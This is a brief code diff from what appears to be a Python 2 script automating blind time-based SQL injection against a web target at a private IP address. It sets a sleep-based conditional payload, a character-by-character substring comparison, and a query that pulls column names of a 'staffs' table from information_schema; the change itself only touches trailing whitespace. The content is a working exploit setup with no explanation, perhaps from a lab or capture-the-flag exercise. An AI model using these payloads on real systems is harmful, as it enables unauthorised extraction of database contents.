@@ -16,6 +16,6 @@ b.l(1,0,0,0,0,10,3,0,0,0)
 b.url = "http://10.0.42.224/?q="  
 b.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"  
 b.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"  
-b.query = "Select column_name from information_schema.columns where table_name='staffs' limit {l2},1"
-b.run()
-print b.result  
+b.query = "Select column_name from information_schema.columns where table_name='staffs' limit {l2},1"  
+b.run()  
+print b.result   
